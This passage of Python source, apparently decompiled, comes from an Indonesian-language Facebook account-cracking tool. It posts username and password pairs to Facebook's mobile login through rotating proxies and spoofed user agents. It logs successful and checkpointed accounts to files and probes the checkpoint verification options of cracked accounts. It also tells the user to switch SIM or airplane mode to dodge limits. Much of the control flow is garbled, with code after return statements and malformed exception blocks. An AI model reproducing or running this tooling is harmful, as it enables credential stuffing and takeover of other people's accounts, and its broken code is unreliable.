    (sys.stdout.write(f'''\r {animasi} {P}{P}{loop}{N}|{P}{len(id)}{P} {P}[{P}OK:{ok}{P}] {P}[{P}CP:{cp}{P}]  | {P}{'{:.0%}'.format(loop / float(len(id2)))}{P}'''),)
    sys.stdout.flush()



def cracktouch(idf, pwv, nmf):
    animasi = random.choice([
        '\x1b[1;97m[VEER]'])
    (sys.stdout.write(f'''\r {animasi} {P}{P}{loop}{N}|{P}{len(id)}{P} {P}[{P}OK:{ok}{P}] {P}[{P}CP:{cp}{P}]  | {P}{'{:.0%}'.format(loop / float(len(id)))}{P}'''),)
    sys.stdout.flush()
    nip = random.choice(prox)
    proxs = {
        'http': 'socks4://' + nip }
    ua = random.choice(ugent)
    ua2 = random.choice(ugent2)
    ses = requests.Session()


def ceker(idf, pw):
    global cp
    clear()
    print(logo)
    ua = ' Mozilla/5.0 (Linux; Android 4.0.4; Galaxy Nexus Build/IMM76B) AppleWebKit/537.36 (KHTML, like Gecko; Mediapartners-Google) Chrome/102.0.5005.61 Mobile Safari/537.36'
    head = {
        'Host': 'm.facebook.com',
        'cache-control': 'max-age=0',
        'upgrade-insecure-requests': '1',
        'origin': 'https://m.facebook.com',
        'content-type': 'application/x-www-form-urlencoded',
        'user-agent': ua,
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'x-requested-with': 'mark.via.gp',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-user': '?1',
        'sec-fetch-dest': 'document',
        'referer': 'https://m.facebook.com/login/?next&ref=dbl&fl&refid=8',
        'accept-encoding': 'gzip, deflate',
        'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' }
    ses = requests.Session()
    
    try:
        hi = ses.get('https://m.facebook.com')
        ho = sop(ses.post('https://m.facebook.com/login.php', {
            'email': idf,
            'pass': pw,
            'login': 'submit' }, head, True, **('data', 'headers', 'allow_redirects')).text, 'html.parser')
        jo = ho.find('form')
        data = { }
        lion = [
            'nh',
            'jazoest',
            'fb_dtsg',
            'submit[Continue]',
            'checkpoint_data']
        for anj in jo('input'):
            if anj.get('name') in lion:
                data.update({
                    anj.get('name'): anj.get('value') })
        kent = sop(ses.post('https://m.facebook.com' + str(jo['action']), data, head, **('data', 'headers')).text, 'html.parser')
        print('\r%s++++ %s|%s ----> CP       %s' % (b, idf, pw, x))
        open('CP/' + cpc, 'a').write(idf + '|' + pw + '\n')
        cp += 1
        opsi = kent.find_all('option')
        if len(opsi) == 0:
            print('\r%s---> Tap Yes / A2F (Cek Login Di Lite/M%s)' % (hh, x))
    finally:
        return None
        for opsii in opsi:
            print('\r%s---> %s%s' % (kk, opsii.text, x))
        return None
        if Exception:
            c = None
            
            try:
                print('\r%s++++ %s|%s ----> CP       %s' % (b, idf, pw, x))
                print('\r%s---> Tidak Dapat Mengecek Opsi (Cek Login Di Lite/M)%s' % (u, x))
                open('CP/' + cpc, 'a').write(idf + '|' + pw + '\n')
                cp += 1
            finally:
                c = None
                del c
                return None
                c = None
                del c




def cek_opsi():
    c = len(akun)
    hu = 'Terdapat %s Akun Untuk Dicek\nSebelum Mulai, Mode Pesawat/Ubah Kartu Sim Terlebih Dahulu' % c
    panjihitam(nel(hu, 'CEK OPSI', **('title',)))
    input(x + '[' + h + '=>' + x + '] Mulai')
    cek = '# PROSES CEK OPSI DIMULAI'
    sol().print(mark(cek, 'green', **('style',)))
    love = 0
    for kes in akun:
        
        try:
            
            try:
                id = kes.split('|')[0]
                pw = kes.split('|')[1]
            finally:
                pass
            if IndexError:
                time.sleep(2)
                print('\r%s++++ %s ----> Error      %s' % (b, kes, x))
                print('\r%s---> Pemisah Tidak Didukung Untuk Program Ini%s' % (u, x))
            continue
            bi = random.choice([
                u,
                k,
                kk,
                b,
                h,
                hh])
            sys.stdout.flush()
            ua = ' Mozilla/5.0 (Linux; Android 5.0.2) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/49.0.829.0 Safari/535.1'
            ses = requests.Session()
            header = {
                'Host': 'm.facebook.com',
                'cache-control': 'max-age=0',
                'upgrade-insecure-requests': '1',
                'origin': 'https://m.facebook.com',
                'content-type': 'application/x-www-form-urlencoded',
                'user-agent': ua,
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'x-requested-with': 'mark.via.gp',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-user': '?1',
                'sec-fetch-dest': 'document',
                'referer': 'https://m.facebook.com/login/?next&ref=dbl&fl&refid=8',
                'accept-encoding': 'gzip, deflate',
                'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' }
            hi = ses.get('https://m.facebook.com')
            ho = sop(ses.post('https://m.facebook.com/login.php', {
                'email': id,
                'pass': pw,
                'login': 'submit' }, header, True, **('data', 'headers', 'allow_redirects')).text, 'html.parser')
            if 'checkpoint' in ses.cookies.get_dict().keys():
                
                try:
                    jo = ho.find('form')
                    data = { }
                    lion = [
                        'nh',
                        'jazoest',
                        'fb_dtsg',
                        'submit[Continue]',
                        'checkpoint_data']
                    for anj in jo('input'):
                        if anj.get('name') in lion:
                            data.update({
                                anj.get('name'): anj.get('value') })
                            continue
                    kent = sop(ses.post('https://m.facebook.com' + str(jo['action']), data, header, **('data', 'headers')).text, 'html.parser')
                    print('\r%s++++ %s|%s ----> CP       %s' % (b, id, pw, x))
                    opsi = kent.find_all('option')
                    if len(opsi) == 0:
                        print('\r%s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)' % (hh, x))
                    else:
                        for opsii in opsi:
                            print('\r%s---> %s%s' % (kk, opsii.text, x))
                print('\r%s++++ %s|%s ----> CP       %s' % (b, id, pw, x))
                print('\r%s---> Tidak Dapat Mengecek Opsi%s' % (u, x))
                if 'c_user' in ses.cookies.get_dict().keys():
                    print('\r%s++++ %s|%s ----> OK       %s' % (h, id, pw, x))
                else:
                    print('\r%s++++ %s|%s ----> SALAH       %s' % (x, id, pw, x))


            love += 1
        finally:
            continue
            if requests.exceptions.ConnectionError:
                print('')
                li = '# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI'
                sol().print(mark(li, 'red', **('style',)))
                exit()
                continue
            dah = '# DONE'
            sol().print(mark(dah, 'green', **('style',)))
            exit()
            return None


if __name__ == '__main__':
    os.system('clear')
    loading()
    
    try:
        os.system('git pull')
    finally:
        pass
    
    try:
        os.system('touch .prox.txt')
    finally:
        pass
    
    try:
        os.mkdir('CP')
    finally:
        pass
    
    try:
        os.mkdir('OK')
    finally:
        pass
    
    try:
        os.mkdir('DUMP')
    finally:
        pass
    
    try:
        os.system('pkg install play-audio')
    finally:
        pass
    login()
    return None
    return None






